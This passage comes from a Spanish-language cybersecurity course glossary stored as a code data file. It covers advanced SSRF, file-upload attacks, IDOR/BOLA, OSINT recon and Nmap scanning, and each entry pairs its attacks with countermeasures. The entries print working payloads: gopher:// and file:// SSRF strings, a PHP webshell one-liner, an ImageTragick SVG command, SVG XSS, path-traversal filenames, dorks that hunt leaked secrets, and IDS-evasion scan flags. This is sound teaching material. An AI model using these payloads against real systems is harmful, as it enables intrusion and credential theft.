      "PayPal 2017 Omer Gil: cache deception seminal research.",
    ],
    related: ["HTTP Request Smuggling (CL.TE, TE.CL, H2.CL)", "Cross-Site Scripting (XSS)", "HTTP Parameter Pollution (HPP)", "Headers de seguridad"],
  },
  {
    id: 276,
    module: 24,
    term: "SSRF avanzado: DNS rebinding y protocol smuggling",
    short: "Cuando IP allowlist se aplica en resolución vs conexión, DNS rebinding evade. gopher://, dict://, file:// abren canales lateral.",
    detail:
      "El SSRF básico apunta a IPs privadas (169.254.169.254, 10.0.0.0/8). Las apps modernas **validan** el hostname antes de request. Los vectores avanzados evaden esas defensas.\n" +
      "\n**Vector 1: DNS Rebinding — TOCTOU en el DNS**\n" +
      "```\nAtacante controla evil.com.\nquery 1: evil.com → 1.2.3.4 (público, pasa allowlist)\nquery 2 (2s después): evil.com → 169.254.169.254 (metadata AWS)\n```\n" +
      "1. App valida `hostname === 'evil.com'` y resuelve DNS → obtiene `1.2.3.4`. IP permitida.\n" +
      "2. Hace HTTP GET a `evil.com`. Vuelve a resolver DNS → esta vez atacante devuelve `169.254.169.254`.\n" +
      "3. Server contacta metadata AWS y devuelve credenciales.\n" +
      "\n**Fix**: resolver DNS **una vez** y usar la IP resuelta para el request; verificar IP en cada intento.\n" +
      "\n**Vector 2: Redirects en el fetch**\n" +
      "```\nAtacante URL: http://evil.com/redirect\nResponse: 302 Location: http://169.254.169.254/latest/meta-data/\n// Si el fetcher sigue redirects sin re-validar, hits metadata.\n```\n" +
      "\n**Vector 3: URL parsing discrepancies (Orange Tsai)**\n" +
      "```\nhttp://foo@evil.com:80@victim.com/\n// Python urllib.parse → host=victim.com\n// Some validators → host=evil.com (accepted)\n// Request hits victim.com internal endpoints\n```\n" +
      "\n**Vector 4: Protocol smuggling — `gopher://`**\n" +
      "```\ngopher://redis.internal:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A\n```\n" +
      "curl con gopher habilitado (default en libcurl) manda bytes raw a puertos internos. Redis, Memcached, SMTP internos son objetivos clásicos.\n" +
      "\n**Vector 5: `file://`**\n" +
      "```\nfile:///etc/passwd\nfile:///proc/self/environ\n```\nSi el fetcher acepta `file:`, exfiltración de archivos locales.\n" +
      "\n**Vector 6: `dict://`, `ldap://`, `sftp://`**\n" +
      "Todo lo que libcurl soporte por default es superficie.\n" +
      "\n**Vector 7: IPv6 y encoded IPs**\n" +
      "```\nhttp://[::ffff:127.0.0.1]/     ← IPv6-mapped IPv4\nhttp://2130706433/               ← 127.0.0.1 en decimal\nhttp://0x7f000001/               ← hex\nhttp://0177.0.0.1/               ← octal\n```\n" +
      "Bypass filters que solo blacklist `127.0.0.1` string.\n" +
      "\n**Contramedidas:**\n" +
      "• **Allowlist estricta de destinos** — no blacklist de IPs privadas.\n" +
      "• **Resolver DNS al principio** y usar la IP resuelta para la conexión.\n" +
      "• **Verificar IP tras resolución** contra rangos privados/link-local (169.254/16, 10/8, 172.16/12, 192.168/16, 127/8).\n" +
      "• **Deshabilitar protocolos peligrosos**: en curl, `--proto '=https'`.\n" +
      "• **No seguir redirects** o revalidar cada uno.\n" +
      "• **En cloud**: IMDSv2 con hop-limit=1 aunque el SSRF exista.\n" +
      "• **VPC egress firewall** que solo permite destinos autorizados.\n" +
      "> 💡 **Orange Tsai's talks** (Black Hat, DEF CON) sobre URL parsing bugs son la referencia.\n" +
      "> ⚠️ SSRF combinado con **admin endpoints internos** (Jenkins, Consul, K8s API) → RCE.",
    examples: [
      "Capital One 2019 explotó SSRF básico a IMDSv1; IMDSv2 lo hubiera cortado.",
      "GitHub SSRF con Gopher a Redis interno (bounty $10K).",
      "Herramienta: SSRFmap enumera protocolos, encodings, DNS rebinding.",
    ],
    related: ["SSRF y metadata cloud", "IMDSv2 y SSRF a metadata", "XML External Entity (XXE)", "OWASP Top 10"],
  },
  {
    id: 277,
    module: 24,
    term: "File upload attacks avanzados",
    short: "MIME confusion, polyglot files, path traversal en filename, ImageTragick — las defensas ingenuas caen todas.",
    detail:
      "Un endpoint de upload es superficie clásica. Las defensas **por MIME** o **por extensión** son insuficientes; polyglots y bypasses son bien conocidos.\n" +
      "\n**Vector 1: Bypass de extension whitelist**\n" +
      "```\nshell.php.jpg    // Apache con AddHandler mal configurado ejecuta\nshell.phtml       // Extension menos común pero PHP-executable\nshell.jsp;.jpg    // IIS <7.5: cuelga en el `;`\nshell.pHP         // Case sensitivity bugs\nshell.php%00.jpg  // Null byte truncation (viejo Python)\n```\n\n" +
      "**Vector 2: MIME confusion**\n" +
      "```\nContent-Type: image/jpeg\nBody: <?php system($_GET['c']); ?>\n// El server confía en Content-Type; el file no es imagen; cuando se ejecuta como PHP → RCE.\n```\n" +
      "**Fix**: validar por *magic bytes* (los primeros bytes del file, `FF D8 FF` para JPEG), no MIME declarado.\n" +
      "\n**Vector 3: Polyglot files — file que es imagen Y PHP**\n" +
      "```\nCabecera JPEG válida (FFD8 FFE0 ...)\nComentario EXIF con `<?php system($_GET['c']); ?>`\nResto del JPEG\n```\n" +
      "El file **es** un JPEG válido (magic bytes correctos, se abre en cualquier viewer). Pero si el server lo procesa como PHP → RCE.\n" +
      "**Herramientas**: **jhead** para inyectar código en EXIF; **PolyGlot** para PDF/JS/HTML polyglots.\n" +
      "\n**Vector 4: Path traversal en filename**\n" +
      "```\nfilename=../../../etc/passwd\nfilename=..\\..\\..\\win.ini\n```\n" +
      "El upload de un file con path traversal en el nombre sobrescribe archivos críticos. Fix: normalizar y usar `basename()`.\n" +
      "\n**Vector 5: ImageTragick (CVE-2016-3714)**\n" +
      "**ImageMagick** procesaba `.mvg` y `.svg` con **delegates** que ejecutaban shell commands. Payload:\n" +
      "```svg\n<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\">\n  <image xlink:href=\"https://example.com/image.jpg|touch /tmp/pwn\"/>\n</svg>\n```\n" +
      "Cada web app que procesaba avatars con IM era RCE. Múltiples parches; ImageTragick 2 en 2018.\n" +
      "\n**Vector 6: SVG con `<script>` — stored XSS**\n" +
      "```svg\n<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>\n```\n" +
      "Si el server sirve SVG con `Content-Type: image/svg+xml`, el browser ejecuta el script. Fix: sanitizer SVG (DOMPurify con `USE_PROFILES: { svg: true }`), o servir `Content-Type: image/png` forzado.\n" +
      "\n**Vector 7: ZIP slip (CVE-2018-8825 et al.)**\n" +
      "Un ZIP con entries `../../../evil` extrae fuera del target dir. Muchas librerías de unzip lo permitían. Fix: validar path resolved dentro del target.\n" +
      "\n**Vector 8: Archivo comprimido bomb (ZIP/GZIP bomb)**\n" +
      "42.zip: **42KB → 4.5PB descomprimido**. Antivirus y clamd colapsaban. Fix: límite de descompresión.\n" +
      "\n**Contramedidas:**\n" +
      "• **Storage fuera del webroot** — el file nunca es ejecutable desde HTTP.\n" +
      "• **Renombrar el file** a un UUID; no confiar en el filename del user.\n" +
      "• **Validar magic bytes** con `file` command o libs (`filetype` en Python).\n" +
      "• **Reprocess images** (thumbnailing via Sharp/Pillow); el output es garantizado no polyglot.\n" +
      "• **Content-Disposition: attachment** para forzar download en tipos ambiguos.\n" +
      "• **Antivirus** en el pipeline (ClamAV escaneando cada upload).\n" +
      "• **Content-Type sniffing off**: `X-Content-Type-Options: nosniff`.\n" +
      "> 💡 **OWASP File Upload Cheat Sheet** cubre 20+ vectores con contramedidas.\n" +
      "> ⚠️ ImageMagick sigue en muchas apps — auditá políticas de delegates y actualizá a 7.x con `policy.xml` estricta.",
    examples: [
      "ImageTragick 2016: multiple bug bounties $5K-$15K.",
      "GitHub 2019: SVG XSS en avatar upload (bug bounty).",
      "Reprocess con Sharp: `sharp(buffer).jpeg({quality:80}).toBuffer()` garantiza JPEG limpio.",
    ],
    related: ["OWASP Top 10", "Cross-Site Scripting (XSS)", "SSRF y metadata cloud", "Vulnerable and Outdated Components"],
  },
  {
    id: 278,
    module: 24,
    term: "IDOR y BOLA en API modernas",
    short: "Cambiar un id numérico o UUID en una request obtiene datos de otro user. La API-Top-10 #1 en 2023.",
    detail:
      "**IDOR** (*Insecure Direct Object Reference*) sigue siendo el bug **más común** en API pentests, ahora rebranded **BOLA** por OWASP API Security Top 10 (2023).\n" +
      "\nEl bug es simple: el endpoint recibe un `id` en URL/body y devuelve el objeto sin verificar que pertenezca al caller. Ver definición #247 para conceptos base. Esta entrada profundiza en **variantes modernas de API**.\n" +
      "\n**Variante 1: BOLA por verb-tampering**\n" +
      "```\nGET /api/orders/123     → check ownership (safe)\nPUT /api/orders/123     → NO check (dev forgot)\nDELETE /api/orders/123  → NO check\n```\n" +
      "Auditar cada verbo separadamente.\n" +
      "\n**Variante 2: BOLA por parameter-tampering**\n" +
      "```\nPATCH /api/users/me { role: 'admin' }\n// user_id inferido de la sesión, pero el body escala el rol via mass assignment\n```\n" +
      "\n**Variante 3: BOPLA (Broken Object Property Level Auth)**\n" +
      "```\nGET /api/users/self\n// Response incluye email, phone, address — todo el user propio.\nGET /api/users/{otro}\n// Response filtra a name + avatar — filtro server-side.\n\nGET /api/users/{otro}?fields=email,phone\n// Si el server obedece 'fields', filtro roto → leak.\n```\n" +
      "\n**Variante 4: IDs enumerables + rate-limit débil**\n" +
      "UUIDs v1 son basados en MAC + timestamp — **secuenciales** si se generan seguido. Un atacante enumera millones de IDs por bruteforce.\n" +
      "\n**Variante 5: Nested resources con auth solo en el padre**\n" +
      "```\nGET /api/orgs/miorg/projects/{cualquier-project}\n// Server valida `miorg` pero no que `project` pertenezca a `miorg`.\n// Atacante accede a projects de otras orgs.\n```\n" +
      "\n**Variante 6: BOLA vía batch endpoints**\n" +
      "```\nPOST /api/batch\n[\n  { \"op\": \"read\", \"resource\": \"/orders/mio\" },  // authorized\n  { \"op\": \"read\", \"resource\": \"/orders/otro\" }  // BOLA if not checked per-op\n]\n```\n" +
      "\n**Variante 7: BOLA por WebSocket**\n" +
      "```\nws.send({ subscribe: 'user:123' })\n// Server suscribe sin verificar que el user autenticado sea 123.\n// Atacante escucha eventos privados de cualquier user.\n```\n" +
      "\n**Herramientas:**\n" +
      "• **Autorize** (Burp) — envía cada request con cookies de otro user, compara.\n" +
      "• **AuthMatrix** (Burp) — matrix de tests por endpoint × user.\n" +
      "• **Escalate** para API discovery.\n" +
      "• **GraphQL Voyager + query fuzzing** para GraphQL BOLA.\n" +
      "\n**Contramedidas defensivas:**\n" +
      "• **Row-level security en DB** — Postgres RLS, Supabase RLS. La DB filtra: `USING (user_id = auth.uid())`.\n" +
      "• **Middleware de authorization en cada endpoint** — no confiar en 'está authenticated'.\n" +
      "• **Preferir IDs opacos + auth server-side** — `/api/me/orders/{id}` en vez de `/api/orders/{id}`.\n" +
      "• **API Gateway policy** que aplica authorization declarativa.\n" +
      "• **Rate-limit por user** — limita enumeration.\n" +
      "• **Fields whitelist en response** — nunca deja al user decidir qué campos ver.\n" +
      "> 💡 **BOLA es el bug más común** en pentests de APIs modernas. Es aburrido pero paga.\n" +
      "> ⚠️ Muchas orgs auditan por 'endpoint' pero olvidan verbos, batch, nested, WebSocket — todos superficies.",
    examples: [
      "Uber 2016 BOLA en cancel-ride ($10K bounty).",
      "Supabase RLS policy: `CREATE POLICY \"users own\" ON orders USING (user_id = auth.uid())`.",
      "AuthMatrix Burp: sistematiza tests de authorization por endpoint × user.",
    ],
    related: ["BOLA / IDOR y Broken Object Level Auth", "OWASP Top 10", "GraphQL security", "AAA (Autenticación, Autorización, Accounting)"],
  },

  // ── M25 · Reconocimiento y OSINT ─────────────────────────────────────────
  {
    id: 280,
    module: 25,
    term: "Reconocimiento pasivo vs activo",
    short: "El pasivo no toca al objetivo; el activo interactúa y deja huella.",
    detail:
      "El **reconocimiento** es la primera fase de cualquier pentest:\n" +
      "| Tipo | Interacción | Detección |\n" +
      "|---|---|---|\n" +
      "| Pasivo | Solo fuentes públicas (OSINT) | Indetectable |\n" +
      "| Activo | Toca el objetivo (escaneo, conexión) | Puede alertar al IDS |\n" +
      "> 💡 Se empieza por el pasivo para construir el mapa del objetivo sin hacer ruido, y solo después se pasa al activo.",
    examples: [
      "Buscar empleados en LinkedIn (pasivo).",
      "Un ping o escaneo de puertos ya es activo.",
    ],
    related: ["Google dorking", "Shodan y Censys", "Frameworks OSINT"],
  },
  {
    id: 281,
    module: 25,
    term: "Google dorking",
    short: "Usar operadores de búsqueda avanzados para encontrar información expuesta.",
    detail:
      "El **Google dorking** (*Google hacking*) aprovecha operadores para hallar datos sensibles indexados: paneles de login, archivos, errores.\n" +
      "site:ejemplo.com filetype:pdf\n" +
      "intitle:\"index of\" \"backup\"\n" +
      "> 💡 La **Google Hacking Database (GHDB)** de Exploit-DB recopila dorks útiles.",
    examples: [
      "site:target.com -www para descubrir subdominios.",
      "filetype:env DB_PASSWORD para buscar secretos filtrados.",
    ],
    related: ["Reconocimiento pasivo vs activo", "Shodan y Censys", "OSINT"],
  },
  {
    id: 282,
    module: 25,
    term: "Shodan y Censys",
    short: "Buscadores de dispositivos conectados a Internet, no de páginas web.",
    detail:
      "**Shodan** y **Censys** indexan **hosts y servicios** expuestos (puertos, banners, certificados, cámaras, ICS), no contenido web. Permiten encontrar la superficie de ataque de una organización sin tocarla (recon pasivo).",
    examples: [
      "Buscar en Shodan servidores RDP expuestos de una organización.",
      "Censys para enumerar certificados y subdominios de un dominio.",
    ],
    related: ["Google dorking", "Reconocimiento pasivo vs activo", "Superficie de ataque"],
  },
  {
    id: 283,
    module: 25,
    term: "Frameworks OSINT",
    short: "Herramientas que automatizan la recolección y correlación de inteligencia abierta.",
    detail:
      "Más allá de búsquedas manuales, hay herramientas dedicadas:\n" +
      "• **theHarvester** — correos, subdominios y hosts de fuentes públicas.\n" +
      "• **Maltego** — correlación visual de relaciones (personas, dominios, infra).\n" +
      "• **Recon-ng / SpiderFoot** — frameworks modulares de automatización OSINT.\n" +
      "theHarvester -d ejemplo.com -b all",
    examples: [
      "theHarvester reuniendo correos para un phishing dirigido.",
      "Maltego graficando la infraestructura de un objetivo.",
    ],
    related: ["OSINT", "Reconocimiento pasivo vs activo", "Shodan y Censys"],
  },
  {
    id: 284,
    module: 25,
    term: "Subdomain enumeration moderno (amass, subfinder, crt.sh)",
    short: "Combinar Certificate Transparency logs + brute force + APIs de terceros para mapear TODA la superficie de un dominio.",
    detail:
      "Un solo dominio (`tesla.com`) suele tener **cientos de subdominios** con exposiciones dispares. El moderno recon combina 3 técnicas paralelas:\n" +
      "\n**1. Certificate Transparency (crt.sh, Censys):**\n" +
      "Cada cert SSL emitido por CA moderna se publica en logs públicos. Query:\n" +
      "```\ncurl -s 'https://crt.sh/?q=%.tesla.com&output=json' | jq -r '.[].name_value' | sort -u\n```\nRecupera subdominios que hicieron cert alguna vez — incluye **staging, dev, internal** que nunca aparecieron en DNS público.\n" +
      "\n**2. Passive DNS + APIs de terceros (subfinder):**\n" +
      "```\nsubfinder -d tesla.com -all -recursive\n```\n" +
      "Consulta 30+ fuentes: SecurityTrails, VirusTotal, PassiveTotal, DNSDumpster, Shodan, GitHub, WaybackMachine, AlienVault OTX.\n" +
      "\n**3. Brute-force + permutations (amass, puredns):**\n" +
      "```\namass enum -active -d tesla.com -brute -w subdomains-top1m-5000.txt\npuredns bruteforce wordlist.txt tesla.com -r resolvers.txt\n```\n" +
      "**Permutation-based**: descubre `dev-api.tesla.com`, `staging.api-v2.tesla.com` combinando patterns con subdomains ya conocidos.\n" +
      "\n**4. HTTP fingerprint (httpx):**\nDespués de resolver, pasar por httpx para filtrar los que están vivos + tech stack:\n" +
      "```\nsubfinder -d tesla.com | httpx -status-code -tech-detect -title\n```\n" +
      "\n**5. Orquestación (recon-ng, ProjectDiscovery pipeline):**\n" +
      "```\nsubfinder -d tesla.com | httpx | nuclei -t cves/ -severity critical\n```\n" +
      "El pipeline recon → alive check → vuln scanner es el estándar moderno.\n" +
      "> 💡 **crt.sh permite dorking retroactivo:** subdominios que existieron 3 años atrás y ya no aparecen en DNS público, pero cuyos hosts pueden seguir vivos.\n" +
      "> ⚠️ Wildcard DNS (`*.tesla.com → CDN`) genera ruido — todos los subdominios random resuelven. Filtrar con httpx status codes.",
    examples: [
      "chaos-client de ProjectDiscovery: subdominios de bug bounty programs actualizados en tiempo real.",
      "assetfinder de tomnomnom: quick-and-dirty subdomain enum.",
      "Amass DB (SQLite) persiste todo el recon histórico de un target para diffing entre engagements.",
    ],
    related: ["Reconocimiento pasivo vs activo", "OSINT", "Google Dorking avanzado y GitHub dorking", "Shodan/Censys queries avanzadas"],
  },
  {
    id: 285,
    module: 25,
    term: "Google Dorking avanzado y GitHub dorking",
    short: "Operadores de búsqueda que descubren credenciales, paneles admin, backups .sql, y secretos en repos públicos.",
    detail:
      "**Google Dorking** (a veces llamado *Google Hacking*) usa operadores de búsqueda para descubrir información sensible indexada. El repositorio de referencia es el **Google Hacking Database (GHDB)** de exploit-db.\n" +
      "\n**Operadores clave:**\n" +
      "| Operator | Uso | Ejemplo |\n" +
      "|---|---|---|\n" +
      "| `site:` | Restringe a un dominio | `site:tesla.com` |\n" +
      "| `filetype:` (o `ext:`) | Tipo de archivo | `filetype:pdf` |\n" +
      "| `intitle:` | Palabra en `<title>` | `intitle:\"index of\"` |\n" +
      "| `inurl:` | Palabra en URL | `inurl:admin` |\n" +
      "| `intext:` | Palabra en body | `intext:\"api_key\"` |\n" +
      "| `cache:` | Snapshot cacheado | `cache:target.com` |\n" +
      "| `-word` | Excluir | `site:tesla.com -blog` |\n" +
      "| `\"exact phrase\"` | Match exacto | `\"internal use only\"` |\n" +
      "\n**Dorks emblemáticos (buscar SIEMPRE con permiso):**\n" +
      "```\nsite:target.com filetype:sql\nsite:target.com intext:\"password\" filetype:txt\nsite:target.com intitle:\"index of\" (config|backup)\nsite:target.com ext:log\nsite:*.target.com intitle:\"login\" | \"admin\"\n```\n" +
      "\n**GitHub Dorking** — quizás más valioso que Google en 2025. Los devs pushean secrets accidentalmente:\n" +
      "```\n// GitHub Advanced Search\norg:target-org filename:.env password\norg:target-org \"aws_access_key_id\"\norg:target-org \"BEGIN RSA PRIVATE KEY\"\norg:target-org path:.git-credentials\n```\n" +
      "\n**Herramientas de automation:**\n" +
      "• **trufflehog** — escanea repos históricamente por 700+ patrones de secrets.\n" +
      "• **gitleaks** — similar, más rápido, mejor para CI.\n" +
      "• **GitDorker** — orquesta dorks contra la GitHub Search API.\n" +
      "• **GHunt** — OSINT de cuentas Google.\n" +
      "\n> 💡 **GHDB tiene 8000+ dorks catalogados** — muchos siguen siendo efectivos años después.\n" +
      "> ⚠️ Escanear GitHub sin permiso puede violar TOS y leyes locales. Bug bounty scope específico primero.",
    examples: [
      "Uber 2016 (GitHub): AWS creds hardcoded en un repo público → 57M records.",
      "trufflehog contra 20 repos de una org: ~5-15 findings promedio en 2024.",
      "GitDorker + custom wordlist de la target-org: horas → minutos.",
    ],
    related: ["OSINT", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "Shodan/Censys queries avanzadas", "Email/employee OSINT y breach data"],
  },
  {
    id: 286,
    module: 25,
    term: "Shodan/Censys queries avanzadas",
    short: "Buscadores de dispositivos expuestos con filters específicos. Encuentra Kubernetes API pública, RDS abierto, ICS/SCADA.",
    detail:
      "**Shodan** y **Censys** indexan todo el IPv4 (y parte de IPv6) escaneando servicios expuestos. Con queries específicas encontrás **infra crítica expuesta accidentalmente**.\n" +
      "\n**Shodan filters clave:**\n" +
      "```\nport:22 org:\"Tesla Inc\"                 → SSH del target org\nssl.cert.subject.CN:target.com          → certs con CN específico\nhostname:.target.com                    → subdomains ya escaneados\ncountry:AR port:445 os:Windows          → SMB Windows en Argentina\nproduct:elasticsearch port:9200          → ES clusters expuestos\nvuln:CVE-2021-44228                      → hosts vulns a Log4Shell\n\"authentication disabled\" mongo         → MongoDB sin auth (ransomware target)\n\"200 OK\" \"Server: kubernetes\" api        → K8s API públicos\ntitle:\"Admin\" http.status:200            → paneles admin expuestos\n```\n" +
      "\n**Censys — más granular en TLS/cert data:**\n" +
      "```\nservices.tls.certificates.leaf_data.subject.common_name: target.com\nservices.software.vendor: `apache` and services.software.version: `2.4.49`\n```\n" +
      "\n**Alternativas:**\n" +
      "• **ZoomEye** (chino) — buena para Asia\n" +
      "• **LeakIX** — bases de datos abiertas, indexa NoSQL/Elasticsearch\n" +
      "• **BinaryEdge** — buena reputation, freemium\n" +
      "• **Netlas** — nuevo, freemium generoso\n" +
      "• **FOFA** (chino) — a menudo captura assets que Shodan pierde\n" +
      "\n**Ejemplos históricos de findings:**\n" +
      "• **AWS Elasticsearch expuesto en 2019** — Capital One reveló + Shodan dorks para `authentication disabled elasticsearch`.\n" +
      "• **Kubernetes dashboards públicos** — miles indexados con `title:\"Kubernetes Dashboard\" http.status:200`.\n" +
      "• **Cameras IoT default creds** — Mirai botnet (2016) usó dorks Shodan para escanear.\n" +
      "\n**Uso ético (bug bounty):**\n" +
      "1. Confirma que el asset está en scope del programa.\n" +
      "2. Verifica ownership con TXT DNS record del bounty program.\n" +
      "3. Nunca 'explotar' — reportar el finding con Shodan URL.\n" +
      "> 💡 **Shodan Trends** muestra evolución histórica — útil para reportes 'estuvo expuesto por 3 meses'.\n" +
      "> ⚠️ Shodan tiene API gratuita limitada. Membership CLI útil para bulk queries.",
    examples: [
      "Shodan CLI: `shodan search 'org:\"MyTarget\" product:elasticsearch'`.",
      "Bug bounty: reporte con screenshot Shodan + timestamp + confirmed vuln.",
      "Censys dorking para PoC de Log4Shell en 2021: `services.software.product: log4j and services.software.version: 2.14.1`.",
    ],
    related: ["OSINT", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "Reconocimiento pasivo vs activo", "Google Dorking avanzado y GitHub dorking"],
  },
  {
    id: 287,
    module: 25,
    term: "OSINT frameworks: SpiderFoot, Maltego, recon-ng",
    short: "Orquestadores que combinan 100+ fuentes en workflows automatizados. Del target a la cadena completa.",
    detail:
      "Los frameworks OSINT orquestan **decenas de fuentes** (DNS, WHOIS, Shodan, VirusTotal, HaveIBeenPwned, LinkedIn) y **conectan los dots** automáticamente. Ideal para engagement grandes.\n" +
      "\n**1. SpiderFoot**\n" +
      "Open source, 200+ modules. Corre queries paralelas y muestra grafo de relaciones.\n" +
      "```\nspiderfoot -l 127.0.0.1:5001 -s target.com -t DOMAIN_NAME\n```\n" +
      "Modules cubren: cuentas Twitter/GitHub de employees, breach data, subdomains, IPs, SSL history, exposed services.\n" +
      "\n**2. Maltego**\n" +
      "El más visual. Concepto: **entities** (dominios, IPs, personas) y **transforms** (queries que transforman una entity en otras). Community Edition gratis, Classic $$.\n" +
      "\nWorkflow típico:\n" +
      "1. Empezar con `domain:target.com`.\n" +
      "2. Transform 'To DNS Names' → subdominios.\n" +
      "3. Transform 'To IP Addresses' → hosting.\n" +
      "4. Transform 'To Netblock owner' → cloud provider, ASN.\n" +
      "5. Transform 'To Documents (WHOIS)' → contacts.\n" +
      "6. Cross-reference con Maltego Have I Been Pwned transform.\n" +
      "\n**3. recon-ng**\n" +
      "Framework CLI estilo Metasploit para recon. Modulos organizados por categoría (`domains-domains`, `hosts-hosts`, `contacts-credentials`).\n" +
      "```\nrecon-ng\n[recon-ng] > marketplace search subdomains\n[recon-ng] > modules load recon/domains-hosts/hackertarget\n[recon-ng] > options set SOURCE tesla.com\n[recon-ng] > run\n```\nLa data se persiste en SQLite; puede exportar a Neo4j para análisis de grafos.\n" +
      "\n**4. theHarvester (rápido, focus emails/subdominios)**\n" +
      "```\ntheHarvester -d tesla.com -l 500 -b all\n```\n" +
      "\n**5. Frameworks nuevos (2023-2025):**\n" +
      "• **OSINT-Framework** (osintframework.com) — árbol de decisión de herramientas por categoría.\n" +
      "• **Sn1per** — automated recon full-suite (algunos módulos activos).\n" +
      "• **AutoRecon** — orchestration para HTB/OSCP style.\n" +
      "\n> 💡 **SpiderFoot HX** (versión cloud comercial) integra con Maltego para pipelines híbridos.\n" +
      "> ⚠️ Muchos transforms de Maltego necesitan API keys de servicios pagos (Shodan, PassiveTotal) — el 'free tier' es limitado.",
    examples: [
      "SpiderFoot scan de un dominio target: ~2-4 horas full scan, produce cientos de datapoints.",
      "Maltego + custom Python transforms para integrar herramientas propias.",
      "recon-ng con Neo4j export para pentest reports visuales de grafos.",
    ],
    related: ["OSINT", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "Email/employee OSINT y breach data", "Reconocimiento pasivo vs activo"],
  },
  {
    id: 288,
    module: 25,
    term: "Email/employee OSINT y breach data",
    short: "Enumerar empleados + verificar credenciales filtradas es la base del initial access moderno (BEC, spear phishing, credential stuffing).",
    detail:
      "El **factor humano** es el vector primario de compromiso. Antes de phishing/social eng, mapeá **quién trabaja en el target** y **qué credenciales ya están filtradas**.\n" +
      "\n**Enumeration de empleados:**\n" +
      "\n**LinkedIn — la mina de oro:**\n" +
      "• **Sales Navigator** — filtra por empresa + rol + antigüedad.\n" +
      "• **CrossLinked** (herramienta) — permutations de nombres a formatos email (`first.last@`, `flast@`, `firstl@`).\n" +
      "• **PhoneBook.cz** — email guessing por patterns organizacionales.\n" +
      "\n**Hunter.io** — API de email discovery:\n" +
      "```\ncurl https://api.hunter.io/v2/domain-search?domain=tesla.com&api_key=...\n```\nDevuelve emails known + patterns. Free tier limitado.\n" +
      "\n**theHarvester + emailrep.io:**\n" +
      "```\ntheHarvester -d target.com -b google,linkedin,twitter\n```\n" +
      "\n**LinkedIn2Username, linkedin-scraper**: convertir nombres LI → email patterns.\n" +
      "\n**Verificación de credenciales filtradas (breach data):**\n" +
      "\n**Have I Been Pwned (HIBP):**\n" +
      "• API pública: verificar si un email aparece en breaches conocidos.\n" +
      "• 'Passwords' API (K-Anonymity): verificar si un password hash aparece filtrado sin revelar el password full.\n" +
      "```\ncurl https://api.pwnedpasswords.com/range/21BD1  # primeros 5 chars del SHA1\n```\n" +
      "\n**Combolists / dumps públicos:**\n" +
      "• **DeHashed** — API paga con billones de credentials.\n" +
      "• **LeakCheck** — similar.\n" +
      "• **Snusbase** — el clásico ruso.\n" +
      "• **IntelX** — mucha data de dark web.\n" +
      "\n**Credential stuffing:**\nCon `<email>:<password>` pairs de breaches, herramientas como **Sentry MBA**, **OpenBullet**, **snipr** intentan el mismo par contra 200+ SaaS. Requiere IPs residenciales rotating (proxies) para evitar rate-limit.\n" +
      "\n**Contexto para defenders:**\n" +
      "• MFA obligatoria + resistente a phishing (FIDO2)\n" +
      "• Password reuse detection (comparar hash pwnedpasswords en signup/login)\n" +
      "• Monitoring de la propia empresa en HIBP + notificación proactiva a empleados\n" +
      "\n> 💡 **En 2024 ~65% de empleados corporativos tienen ≥1 credential leaked en breaches conocidos** (Verizon DBIR).\n" +
      "> ⚠️ Usar credentials filtradas contra targets **sin permiso explícito** es ilegal. Solo en pentest con autorización.",
    examples: [
      "Uber 2016 (parte 2): contractor con creds leaked + MFA push fatigue → account takeover.",
      "SolarWinds initial access: LinkedIn recon + phishing spear al perfil técnico correcto.",
      "Colonial Pipeline 2021: password reutilizado, aparecía en breach, sin MFA → ransomware $4.4M.",
    ],
    related: ["OSINT", "Ingeniería social", "MFA y autenticación moderna", "Ataques a MFA"],
  },

  // ── M26 · Escaneo con Nmap ───────────────────────────────────────────────
  {
    id: 290,
    module: 26,
    term: "Tipos de escaneo Nmap",
    short: "SYN, TCP connect y UDP: distintas formas de descubrir puertos según sigilo y permisos.",
    detail:
      "**Nmap** descubre puertos abiertos con distintas técnicas:\n" +
      "| Flag | Tipo | Nota |\n" +
      "|---|---|---|\n" +
      "| -sS | SYN (half-open) | Rápido y sigiloso (requiere root) |\n" +
      "| -sT | TCP connect | Completa el handshake (sin root) |\n" +
      "| -sU | UDP | Lento; descubre DNS, SNMP, etc. |\n" +
      "nmap -sS -p- 10.0.0.5\n" +
      "> 💡 `-p-` escanea los 65535 puertos; sin él, Nmap prueba los 1000 más comunes.",
    examples: [
      "nmap -sS -sV -p- objetivo para puertos + versiones.",
      "No olvidar -sU: muchos servicios viven en UDP.",
    ],
    related: ["NSE scripts", "Detección de servicio y OS", "Three-way handshake"],
  },
  {
    id: 291,
    module: 26,
    term: "NSE scripts",
    short: "El motor de scripting de Nmap automatiza detección de vulns, enum y más.",
    detail:
      "El **NSE** (*Nmap Scripting Engine*) extiende Nmap con scripts (en Lua) para enumeración, detección de vulnerabilidades y hasta explotación ligera. Se agrupan en categorías (`default`, `safe`, `vuln`).\n" +
      "nmap --script vuln 10.0.0.5\n" +
      "> ⚠️ La categoría `vuln`/`exploit` es intrusiva: solo con autorización.",
    examples: [
      "nmap --script smb-enum-shares para listar shares SMB.",
      "nmap -sC ejecuta los scripts por defecto.",
    ],
    related: ["Tipos de escaneo Nmap", "Detección de servicio y OS", "Enumeración SMB y NetBIOS"],
  },
  {
    id: 292,
    module: 26,
    term: "Detección de servicio y OS",
    short: "Nmap identifica qué versión de servicio corre y qué sistema operativo es el host.",
    detail:
      "Con **-sV** Nmap hace *banner grabbing* y fingerprinting para deducir el **servicio y versión** de cada puerto; con **-O**, el **sistema operativo** por las peculiaridades de su pila TCP/IP. Saber la versión exacta es clave para buscar CVEs aplicables.",
    examples: [
      "nmap -sV revela 'Apache 2.4.49' (con CVE conocida).",
      "nmap -O estima Linux 5.x vs Windows Server.",
    ],
    related: ["Tipos de escaneo Nmap", "Análisis de vulnerabilidades", "CVE y CVSS"],
  },
  {
    id: 293,
    module: 26,
    term: "Evasión de IDS/firewall",
    short: "Técnicas para escanear sin disparar las defensas del objetivo.",
    detail:
      "Nmap ofrece opciones para evadir detección: **fragmentación** (`-f`), **timing lento** (`-T1/-T2`), **señuelos** (`-D`) que mezclan IPs falsas, y cambiar el **puerto de origen**.\n" +
      "nmap -sS -T2 -f -D RND:5 objetivo\n" +
